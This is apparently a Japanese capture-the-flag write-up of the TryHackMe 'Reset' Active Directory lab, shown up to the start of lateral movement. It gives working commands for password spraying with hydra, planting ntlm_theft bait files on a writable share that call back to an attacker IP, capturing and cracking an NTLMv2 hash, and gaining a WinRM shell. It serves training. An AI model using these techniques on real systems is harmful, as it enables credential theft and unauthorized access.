![](https://i.imgur.com/uTT7I2q.png)

- URL : https://tryhackme.com/room/resetui
- #hard
- OS : #Windows
- Machine Author(s): tryhackme,h4sh3m00
- Hack Date: 2025-06-02,15:15


# Enumeration
- SMBに匿名ログインできるか
- LDAPに匿名でどこまでわかるか

| ポート番号     | サービス名        | 補足情報                                                               |
| --------- | ------------ | ------------------------------------------------------------------ |
| 53/tcp    | **DNS**      | DNS応答あり（バージョン問い合わせ）                                                |
| 88/tcp    | **kerberos** | Windows Kerberos、サーバー時刻: 2025-06-02                                |
| 135/tcp   | msrpc        | Microsoft Windows RPC                                              |
| 139/tcp   | netbios-ssn  | Microsoft Windows NetBIOSセッションサービス                                 |
| 389/tcp   | **ldap**     | Active Directory LDAP、ドメイン: thm.corp0、サイト: Default-First-Site-Name |
| 445/tcp   | **SMB**      | SMBポート、詳細不明                                                        |
| 464/tcp   | kpasswd5?    | Kerberos パスワード変更用ポート（詳細不明）                                         |
| 593/tcp   | ncacn_http   | RPC over HTTP 1.0                                                  |
| 636/tcp   | LDAPS        | 暗号化LDAP (LDAPS)、ラップされたため詳細不明                                       |
| 3268/tcp  | ldap         | グローバルカタログLDAP、同上のAD情報                                              |
| 3269/tcp  | tcpwrapped   | 暗号化グローバルカタログLDAP、ラップされ詳細不明                                         |
| 3389/tcp  | **RDP**      | RDP (リモートデスクトップ)、10.0.17763                                        |
| 5985/tcp  | **WinRM**    | Windows HTTPAPI (WinRM)、タイトル: Not Found                            |
| 9389/tcp  | ADWS         | .NET Message Framing                                               |
| 49669/tcp | msrpc        | Microsoft Windows RPC                                              |
| 49670/tcp | ncacn_http   | RPC over HTTP 1.0                                                  |
| 49671/tcp | msrpc        | Microsoft Windows RPC                                              |
| 49673/tcp | msrpc        | Microsoft Windows RPC                                              |
| 49675/tcp | msrpc        | Microsoft Windows RPC                                              |
| 49702/tcp | msrpc        | Microsoft Windows RPC                                              |
| 62126/tcp | msrpc        | Microsoft Windows RPC                                              |

```sh
echo -e '\nexport Target_IP="10.10.141.165"' >> ~/.bashrc
source ~/.bashrc
sudo nmap -p0-65535 -T4 -Pn --open $Target_IP -oG open_ports.txt
ports=$(grep "Ports:" open_ports.txt | awk -F'Ports: ' '{print $2}' | tr ',' '\n' | awk -F'/' '{print $1}' | tr '\n' ',' | sed 's/,$//')
sudo nmap -sCV -A -Pn -p"$ports"  $Target_IP
```

```bash

PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-02 06:20:03Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.corp0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.corp0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: THM
|   NetBIOS_Domain_Name: THM
|   NetBIOS_Computer_Name: HAYSTACK
|   DNS_Domain_Name: thm.corp
|   DNS_Computer_Name: HayStack.thm.corp
|   DNS_Tree_Name: thm.corp
|   Product_Version: 10.0.17763
|_  System_Time: 2025-06-02T06:22:23+00:00
| ssl-cert: Subject: commonName=HayStack.thm.corp
| Not valid before: 2025-06-01T06:09:18
|_Not valid after:  2025-12-01T06:09:18
|_ssl-date: 2025-06-02T06:23:03+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  msrpc         Microsoft Windows RPC
49702/tcp open  msrpc         Microsoft Windows RPC
62126/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=6/2%Time=683D4298%P=x86_64-pc-linux-gnu%r(DNSVe
SF:rsionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x
SF:04bind\0\0\x10\0\x03");
MAC Address: 02:BA:0C:D3:4B:8B (Unknown)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 1 hop
Service Info: Host: HAYSTACK; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: HAYSTACK, NetBIOS user: <unknown>, NetBIOS MAC: 02:ba:0c:d3:4b:8b (unknown)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-06-02T06:22:23
|_  start_date: N/A

TRACEROUTE
HOP RTT     ADDRESS
1   0.41 ms 10.10.141.165

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 189.08 seconds

```


## SMB
匿名ログインできる
- Dataが見るべきかな？
```bash
root@ip-10-10-62-146:~# smbclient -N -L //$Target_IP

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	Data            Disk      
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available

```


Data
- それぞれのファイル名が逐一変わっている
	- どの頻度で変わっていくのかは不明
	- しかしファイルサイズは変わらないため名前のみが変わっていると推測
```zsh
root@ip-10-10-62-146:~# smbclient -N \\\\$Target_IP\\Data
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jul 19 09:40:57 2023
  ..                                  D        0  Wed Jul 19 09:40:57 2023
  onboarding                          D        0  Mon Jun  2 07:27:46 2025

		7863807 blocks of size 4096. 3002270 blocks available
smb: \> cd onboarding
smb: \onboarding\> ls
  .                                   D        0  Mon Jun  2 07:27:46 2025
  ..                                  D        0  Mon Jun  2 07:27:46 2025
  41awuf5a.mtq.pdf                    A  4700896  Mon Jul 17 09:11:53 2023
  eaz5kdr0.m3w.pdf                    A  3032659  Mon Jul 17 09:12:09 2023
  tjiynah4.t3v.txt                    A      521  Mon Aug 21 19:21:59 2023

		7863807 blocks of size 4096. 3002270 blocks available
smb: \onboarding\> mget *.pdf
Get file 4crfgdr4.ubr.pdf? Y
getting file \onboarding\4crfgdr4.ubr.pdf of size 3032659 as 4crfgdr4.ubr.pdf (37488.3 KiloBytes/sec) (average 37488.4 KiloBytes/sec)
Get file j1b11ynd.uvs.pdf? Y   
getting file \onboarding\j1b11ynd.uvs.pdf of size 4700896 as j1b11ynd.uvs.pdf (58110.3 KiloBytes/sec) (average 47799.4 KiloBytes/sec)
smb: \onboarding\> mget *.txt
Get file lvqc1pc0.i01.txt? Y
getting file \onboarding\lvqc1pc0.i01.txt of size 521 as lvqc1pc0.i01.txt (254.4 KiloBytes/sec) (average 47205.1 KiloBytes/sec)

```

書き込みもできる
```sh
root@ip-10-10-106-89:~# smbclient -N \\\\10.10.141.165\\Data
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jul 19 09:40:57 2023
  ..                                  D        0  Wed Jul 19 09:40:57 2023
  onboarding                          D        0  Mon Jun  2 10:16:22 2025

		7863807 blocks of size 4096. 3027704 blocks available
smb: \> put test.txt
putting file test.txt as \test.txt (0.0 kb/s) (average 0.0 kb/s)
smb: \> 

```
### tjiynah4.t3v.txt 
```sh
root@ip-10-10-62-146:~# cat lvqc1pc0.i01.txt
Subject: Welcome to Reset -\ufffdDear <USER>,Welcome aboard! We are thrilled to have you join our team. As discussed during the hiring process, we are sending you the necessary login information to access your company account. Please keep this information confidential and do not share it with anyone.The initial passowrd is: ResetMe123!We are confident that you will contribute significantly to our continued success. We look forward to working with you and wish you the very best in your new role.Best regards,The Reset Teamroot@ip-10-10-62-146:~# 

```

翻訳
- パスワードが書いてあるけど、ユーザー名は書かれてない
	- `ResetMe123!`
```sh
件名: Reset へようこそ
親愛なる  <USER> 様
ご入社おめでとうございます！私たちのチームに加わっていただき、大変うれしく思います。
採用プロセス中にお伝えしたとおり、貴社アカウントにアクセスするために必要なログイン情報をお送りいたします。この情報は機密情報ですので、他の人と共有しないでください。
初期パスワードは以下の通りです：
ResetMe123!
あなたが私たちの継続的な成功に大きく貢献してくださると確信しています。これから一緒に働けることを楽しみにしており、新しい役職でのご活躍を心よりお祈りしています。
どうぞよろしくお願いいたします。
Resetチーム一同
```


### eaz5kdr0.m3w.pdf
- 8ページで「会社のポリシーを理解して活用する」というスライド
![](https://i.imgur.com/tjfb1Ij.png)

### 41awuf5a.mtq.pdf
- 9ページからなる「効果的なユーザーオンボーディングの技術」についてのスライド
![](https://i.imgur.com/YkSK0bQ.png)


7ページ目にメールの例があって、tjiynah4.t3v.txt のユーザー名も書かれた例が書かれてる
- 実際にログインできる可能性ある

#### 認証情報ヒント
-  LILY ONEILL : ResetMe123!
![](https://i.imgur.com/JNk8ddr.png)

匿名ログインではrpcclientのコマンド使えない
```sh
root@ip-10-10-246-107:~# rpcclient -U "" -N 10.10.141.165
rpcclient $> srvinfo
do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED
rpcclient $> enumdomains
result was NT_STATUS_ACCESS_DENIED

```


## LDAP
匿名バインドできるか
```bash
root@ip-10-10-62-146:~# ldapsearch -x -H ldap://$Target_IP -b "" -s base
# extended LDIF
#
# LDAPv3
# base <> with scope baseObject
# filter: (objectclass=*)
# requesting: ALL
#

#
dn:
domainFunctionality: 7
forestFunctionality: 7
domainControllerFunctionality: 7
rootDomainNamingContext: DC=thm,DC=corp
ldapServiceName: thm.corp:haystack$@THM.CORP
isGlobalCatalogReady: TRUE
supportedSASLMechanisms: GSSAPI
supportedSASLMechanisms: GSS-SPNEGO
supportedSASLMechanisms: EXTERNAL
supportedSASLMechanisms: DIGEST-MD5
supportedLDAPVersion: 3
supportedLDAPVersion: 2
supportedLDAPPolicies: MaxPoolThreads
supportedLDAPPolicies: MaxPercentDirSyncRequests
supportedLDAPPolicies: MaxDatagramRecv
<SNIP>
subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=thm,DC=corp
serverName: CN=HAYSTACK,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Conf
 iguration,DC=thm,DC=corp
schemaNamingContext: CN=Schema,CN=Configuration,DC=thm,DC=corp
namingContexts: DC=thm,DC=corp
namingContexts: CN=Configuration,DC=thm,DC=corp
namingContexts: CN=Schema,CN=Configuration,DC=thm,DC=corp
namingContexts: DC=DomainDnsZones,DC=thm,DC=corp
namingContexts: DC=ForestDnsZones,DC=thm,DC=corp
isSynchronized: TRUE
highestCommittedUSN: 159837
dsServiceName: CN=NTDS Settings,CN=HAYSTACK,CN=Servers,CN=Default-First-Site-N
 ame,CN=Sites,CN=Configuration,DC=thm,DC=corp
dnsHostName: HayStack.thm.corp
defaultNamingContext: DC=thm,DC=corp
currentTime: 20250602064541.0Z
configurationNamingContext: CN=Configuration,DC=thm,DC=corp


```

Active Directory内のユーザー・グループ・OUなどが匿名で見えるかどうか
- 見えない
```bash
root@ip-10-10-62-146:~# ldapsearch -x -H ldap://$Target_IP -b "DC=thm,DC=corp"
# extended LDIF
#
# LDAPv3
# base <DC=thm,DC=corp> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090ACD, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4563

# numResponses: 1

```

### Hydra
認証情報1のユーザー名を拡張してユーザースプレー攻撃？をする
```bash
LILY_ONEILL
LILY ONEILL
Lily_Onell
lily_onell
LILY-ONEILL
Lily-Onell
lily-onell
lily onell
LILY
ONEILL
oneill
lily
```

johnでの辞書の拡張
```bash
john --wordlist=usernames.txt --rules=wordlist --stdout | sort -u > mut_usernames.txt
```


#### 認証情報1
- ldap2 は simple bind（認証）を試すモード
- LILY_ONEILL : ResetMe123!
```sh
hydra -L mut_usernames.txt -p 'ResetMe123!' -s 389 ldap2://$Target_IP -V

<SNIP>
[ATTEMPT] target 10.10.141.165 - login "lly_nll" - pass "ResetMe123!" - 68 of 110 [child 2] (0/0)
[ATTEMPT] target 10.10.141.165 - login "oneill" - pass "ResetMe123!" - 69 of 110 [child 3] (0/0)
[ATTEMPT] target 10.10.141.165 - login "oneill!" - pass "ResetMe123!" - 70 of 110 [child 4] (0/0)
[ATTEMPT] target 10.10.141.165 - login "oneill." - pass "ResetMe123!" - 71 of 110 [child 5] (0/0)
[389][ldap2] host: 10.10.141.165   login: LILY_ONEILL   password: ResetMe123!
[ATTEMPT] target 10.10.141.165 - login "oneill?" - pass "ResetMe123!" - 72 of 110 [child 9] (0/0)
[ATTEMPT] target 10.10.141.165 - login "oneilL" - pass "ResetMe123!" - 73 of 110 [child 10] (0/0)
[ATTEMPT] target 10.10.141.165 - login "Oneill" - pass "ResetMe123!" - 74 of 110 [child 11] (0/0)
[ATTEMPT] target 10.10.141.165 - login "Oneill!" - pass "ResetMe123!" - 75 of 110 [child 7] (0/0)
<SNIP>
```

```sh
root@ip-10-10-246-107:~# smbmap -H 10.10.141.165 -u "LILY_ONEILL" -p "ResetMe123!"
[+] Finding open SMB ports....
[+] Guest SMB session established on 10.10.141.165...
[+] IP: 10.10.141.165:445	Name: 10.10.141.165                                     
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
[!] Access Denied


smbclient -U LILY_ONEILL%ResetMe123! -L //10.10.141.165
```
## ldapdomaindump
実行する
- 何も得られていない
- 出力されたファイルに中身がない
```sh
root@ip-10-10-62-146:~# ldapdomaindump ldap://$Target_IP --no-json -d thm.corp -u 'THM\LILY_ONEILL' -p 'ResetMe123!'
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```


## WinRM
得られた認証情報1でWinRMにログインできるか
- できない
```sh
root@ip-10-10-62-146:~# evil-winrm -i 10.10.141.165 -u LILY_ONEILL -p 'ResetMe123!'
               
Evil-WinRM shell v3.7
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
```

## RDP
- パスワードが期限切れ（または初回ログイン時に変更を要求されている）？？
```sh
root@ip-10-10-62-146:~# xfreerdp /u:LILY_ONEILL /p:"ResetMe123!" /v:$Target_IP /cert:ignore
[08:19:02:462] [17955:17956] [ERROR][com.freerdp.core] - transport_ssl_cb:freerdp_set_last_error_ex ERRCONNECT_PASSWORD_CERTAINLY_EXPIRED [0x0002000F]
[08:19:02:463] [17955:17956] [ERROR][com.freerdp.core.transport] - BIO_read returned an error: error:14094438:SSL routines:ssl3_read_bytes:tlsv1 alert internal error

```

## RPC
- 認証が通らない
```sh
root@ip-10-10-246-107:~# rpcclient -U "LILY_ONEILL%ResetMe123!" 10.10.141.165
Bad SMB2 (sign_algo_id=1) signature for message
[0000] 00 00 00 00 00 00 00 00   00 00 00 00 00 00 00 00   ........ ........
[0000] 97 18 74 29 88 3F 2D 6D   51 93 8C 37 E8 CA 0E BE   ..t).?-m Q..7....
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED
root@ip-10-10-246-107:~# 

```


LDAPでユーザー・グループの一覧表示
- 失敗する
	- ユーザーの **Common Name（CN）** が LILY_ONEILL というDNと**一致していない**可能性が高い
	- LILY_ONEILL に対応する正しい DN を探す
```sh
ldapsearch -x -H ldap://$Target_IP -D "CN=LILY_ONEILL,CN=Users,DC=thm,DC=corp" -w 'ResetMe123!' -b "DC=thm,DC=corp" "(objectClass=user)" sAMAccountName

ldap_bind: Invalid credentials (49)
	additional info: 80090308: LdapErr: DSID-0C090439, comment: AcceptSecurityContext error, data 52e, v4563
  ```

DNを辞書攻撃で探す
```bash
#!/bin/bash

TARGET_IP="10.10.141.165"
PASSWORD="ResetMe123!"
BASE_DN="DC=thm,DC=corp"
USER_FILE="mut_usernames.txt"

for cn in $(cat "$USER_FILE"); do
    echo "[*] Testing CN=$cn..."

    ldapsearch -x -H ldap://$TARGET_IP \
      -D "CN=$cn,CN=Users,$BASE_DN" \
      -w "$PASSWORD" \
      -b "$BASE_DN" "(objectClass=user)" sAMAccountName >/dev/null 2>&1

    if [ $? -eq 0 ]; then
        echo "[+] SUCCESS: CN=$cn,CN=Users,$BASE_DN"
    fi
done
```



## ASREP-Roasting
認証情報1
- LDAPバインド（認証）が失敗している
```sh
root@ip-10-10-62-146:~# GetUserSPNs.py thm.corp/LILY_ONEILL:ResetMe123! -dc-ip $Target_IP
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[-] Error in searchRequest -> operationsError: 000004DC: LdapErr: DSID-0C090ACD, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4563
```


## Kerberoasting
認証情報1
- ユーザーアカウント LILY_ONEILL が 無効化されている
```sh
root@ip-10-10-62-146:~# GetNPUsers.py thm.corp/LILY_ONEILL:ResetMe123! -dc-ip $Target_IP -usersfile valid_ad_users
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
```





# Foothold
## NTLMハッシュの窃取
sambaのDataには書き込み権限がある
また、sambaでは、ファイル名が頻繁に変わっていることから、他のユーザーの存在がわかる
そのため、このツールを使用することができる
- https://github.com/Greenwolf/ntlm_theft
	- NTLMハッシュの窃取を行う
```sh
git clone https://github.com/Greenwolf/ntlm_theft
```

ファイルの生成
- -s :　攻撃者のIP
```bash
└──╼ $python3 ntlm_theft.py -g all -s 10.9.2.89  -f generate
Created: generate/generate.scf (BROWSE TO FOLDER)
Created: generate/generate-(url).url (BROWSE TO FOLDER)
Created: generate/generate-(icon).url (BROWSE TO FOLDER)
Created: generate/generate.lnk (BROWSE TO FOLDER)
Created: generate/generate.rtf (OPEN)
Created: generate/generate-(stylesheet).xml (OPEN)
Created: generate/generate-(fulldocx).xml (OPEN)
Created: generate/generate.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: generate/generate-(includepicture).docx (OPEN)
Created: generate/generate-(remotetemplate).docx (OPEN)
Created: generate/generate-(frameset).docx (OPEN)
Created: generate/generate-(externalcell).xlsx (OPEN)
Created: generate/generate.wax (OPEN)
Created: generate/generate.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
Created: generate/generate.asx (OPEN)
Created: generate/generate.jnlp (OPEN)
Created: generate/generate.application (DOWNLOAD AND OPEN)
Created: generate/generate.pdf (OPEN AND ALLOW)
Created: generate/zoom-attack-instructions.txt (PASTE TO CHAT)
Created: generate/Autorun.inf (BROWSE TO FOLDER)
Created: generate/desktop.ini (BROWSE TO FOLDER)
Generation Complete.


```

ADが同じネットワーク上にあるっていうことは、responderが使える
- Responderの起動
```bash
sudo responder -I tun0
```

smb上に書き込む
```bash
smbclient -N \\\\10.10.73.63\\Data\\
smb: \onboarding\> cd onboarding
smb: \onboarding\> ls
  .                                   D        0  Mon Jun  2 14:45:17 2025
  ..                                  D        0  Mon Jun  2 14:45:17 2025
  generate-(includepicture).docx      A    10218  Mon Jun  2 14:43:50 2025
  generate-(remotetemplate).docx      A    26285  Mon Jun  2 14:43:57 2025
  generate-(stylesheet).xml           A      163  Mon Jun  2 14:44:04 2025
  generate-(url).url                  A       56  Mon Jun  2 14:44:08 2025
  generate.application                A     1650  Mon Jun  2 14:44:20 2025
  generate.asx                        A      147  Mon Jun  2 14:44:29 2025
  generate.htm                        A       79  Mon Jun  2 14:44:34 2025
  generate.jnlp                       A      192  Mon Jun  2 14:44:37 2025
  generate.lnk                        A     2164  Mon Jun  2 14:44:41 2025
  generate.m3u                        A       49  Mon Jun  2 14:44:44 2025
  generate.pdf                        A      770  Mon Jun  2 14:44:53 2025
  generate.rtf                        A      103  Mon Jun  2 14:44:58 2025
  generate.scf                        A       85  Mon Jun  2 14:45:09 2025
  generate.wax                        A       56  Mon Jun  2 14:45:13 2025
  gjuck5pm.rco.txt                    A      521  Mon Aug 21 18:21:59 2023
  jyvvjnht.of5.pdf                    A  4700896  Mon Jul 17 08:11:53 2023
  nleqbqwh.idw.pdf                    A  3032659  Mon Jul 17 08:12:09 2023
  put                                 A    10218  Mon Jun  2 14:43:40 2025
  zoom-attack-instructions.txt        A      116  Mon Jun  2 14:45:18 2025

		7863807 blocks of size 4096. 3023910 blocks available

```

responder上でNTLMハッシュを取得できる
```bash
──╼ $sudo responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]

<SNIP>
[SMB] NTLMv2-SSP Client   : 10.10.73.63
[SMB] NTLMv2-SSP Username : THM\AUTOMATE
[SMB] NTLMv2-SSP Hash     : AUTOMATE::THM:ba6f67d3a9650f42:86707E539CA98A02C9550A31E147901B:010100000000000000E3AD54CDD3DB01E6942CD121095E7000000000020008004B004D005300420001001E00570049004E002D004500500035004800530036005300300057004A004F0004003400570049004E002D004500500035004800530036005300300057004A004F002E004B004D00530042002E004C004F00430041004C00030014004B004D00530042002E004C004F00430041004C00050014004B004D00530042002E004C004F00430041004C000700080000E3AD54CDD3DB0106000400020000000800300030000000000000000100000000200000D71000EBE351F4F42F3E1112687101B9B76C9C31CE48870ECA79A60D585DBE310A0010000000000000000000000000000000000009001C0063006900660073002F00310030002E0039002E0032002E00380039000000000000000000
[*] Skipping previously captured hash for THM\AUTOMATE
[*] Skipping previously captured hash for THM\AUTOMATE

```

- THM\AUTOMATEの NTLMv2-SSP チャレンジレスポンス
	- SMBから取得されたハッシュ
```sh
echo 'AUTOMATE::THM:ba6f67d3a9650f42:86707E539CA98A02C9550A31E147901B:010100000000000000E3AD54CDD3DB01E6942CD121095E7000000000020008004B004D005300420001001E00570049004E002D004500500035004800530036005300300057004A004F0004003400570049004E002D004500500035004800530036005300300057004A004F002E004B004D00530042002E004C004F00430041004C00030014004B004D00530042002E004C004F00430041004C00050014004B004D00530042002E004C004F00430041004C000700080000E3AD54CDD3DB0106000400020000000800300030000000000000000100000000200000D71000EBE351F4F42F3E1112687101B9B76C9C31CE48870ECA79A60D585DBE310A0010000000000000000000000000000000000009001C0063006900660073002F00310030002E0039002E0032002E00380039000000000000000000' > hash.txt

```

ハッシュのクラックを試みる
```bash
sudo gunzip /usr/share/wordlists/rockyou.txt
hashcat hash.txt /usr/share/wordlists/rockyou.txt
```

クラックできた
```sh
<SNIP>
Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

AUTOMATE::THM:ba6f67d3a9650f42:86707e539ca98a02c9550a31e147901b:010100000000000000e3ad54cdd3db01e6942cd121095e7000000000020008004b004d005300420001001e00570049004e002d004500500035004800530036005300300057004a004f0004003400570049004e002d004500500035004800530036005300300057004a004f002e004b004d00530042002e004c004f00430041004c00030014004b004d00530042002e004c004f00430041004c00050014004b004d00530042002e004c004f00430041004c000700080000e3ad54cdd3db0106000400020000000800300030000000000000000100000000200000d71000ebe351f4f42f3e1112687101b9b76c9c31ce48870eca79a60d585dbe310a0010000000000000000000000000000000000009001c0063006900660073002f00310030002e0039002e0032002e00380039000000000000000000:Passw0rd1

<SNIP>
```

### 認証情報2
- AUTOMATE : Passw0rd1

WinRmで使えるのか
- 使えた
```sh
└──╼ $evil-winrm -i 10.10.73.63 -u AUTOMATE -p Passw0rd1
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\automate\Documents> 
```

user.txtの取得
```sh
*Evil-WinRM* PS C:\Users\automate\Desktop> dir


    Directory: C:\Users\automate\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        6/21/2016   3:36 PM            527 EC2 Feedback.website
-a----        6/21/2016   3:36 PM            554 EC2 Microsoft Windows Guide.website
-a----        6/16/2023   4:35 PM             31 user.txt

```



# Lateral Movement
automateユーザーの権限確認
- 特に目立った権限はない
	- `BUILTIN\Pre-Windows 2000 Compatible Access` : 互換性維持用。通常のドメインユーザーにも割り当てられることが多い
```sh
*Evil-WinRM* PS C:\Users> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
w*Evil-WinRM* PS C:\Users> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
```

 C:\Users\の確認
```bash
*Evil-WinRM* PS C:\Users\automate\Desktop> ls ../../

    Directory: C:\Users

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        7/10/2023  10:23 AM                Administrator
d-----        1/26/2024   9:02 PM                automate
d-----         6/2/2025   2:14 PM                CECILE_WONG
d-r---        6/16/2023   4:17 PM                Public

```

user.txtと同じフォルダにあったファイル
- 特に関係なさそう？？
```bash
*Evil-WinRM* PS C:\Users\automate\Desktop> type 'EC2 Feedback.website'
[{000214A0-0000-0000-C000-000000000046}]
Prop3=19,11
Prop4=31,Amazon Web Services Survey
[InternetShortcut]
IDList=
URL=https://aws.qualtrics.com/SE/?SID=SV_e5MoFJhV18gTAyw
IconFile=https://aws.qualtrics.com/WRQualtricsShared/Brands/amazonmr/favicon.ico
IconIndex=1
[{A7AF692E-098D-4C08-A225-D433CA835ED0}]
Prop5=3,0
Prop9=19,0
Prop2=65,2C0000000000000001000000FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEB010000420000006F0500009A0200005B
[{9F4C2855-9F79-4B39-A8D0-E1D42DE1D5F3}]
Prop5=8,Microsoft.Website.41922747.DA8E48B2
*Evil-WinRM* PS C:\Users\automate\Desktop> type 'EC2 Microsoft Windows Guide.website'
[{000214A0-0000-0000-C000-000000000046}]
Prop3=19,2
Prop4=31,What Is Amazon EC2? - Amazon Elastic Compute Cloud
[InternetShortcut]
IDList=
URL=http://docs.aws.amazon.com/AWSEC2/latest/WindowsGuide/IntroWindowsUserGuide.html
IconFile=http://d36cz9buwru1tt.cloudfront.net/favicon.ico
IconIndex=1
[{A7AF692E-098D-4C08-A225-D433CA835ED0}]
Prop5=3,0
Prop9=19,0
Prop2=65,2C0000000000000001000000FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFA20000004A00000026040000A3020000D8
[{9F4C2855-9F79-4B39-A8D0-E1D42DE1D5F3}]
Prop5=8,Microsoft.Website.DC9AD30B.5334099

```

ユーザー一覧
```sh
*Evil-WinRM* PS C:\Users\automate\Documents> net user

User accounts for \\

-------------------------------------------------------------------------------
3091731410SA             3811465497SA             3966486072SA
Administrator            ANDY_BLACKWELL           AUGUSTA_HAMILTON
AUTOMATE                 CECILE_WONG              CHERYL_MULLINS
CHRISTINA_MCCORMICK      CRUZ_HALL                CYRUS_WHITEHEAD
DANIEL_CHRISTENSEN       DARLA_WINTERS            DEANNE_WASHINGTON
ELLIOT_CHARLES           ERNESTO_SILVA            FANNY_ALLISON
Guest                    HORACE_BOYLE             HOWARD_PAGE
JULIANNE_HOWE            krbtgt                   LEANN_LONG
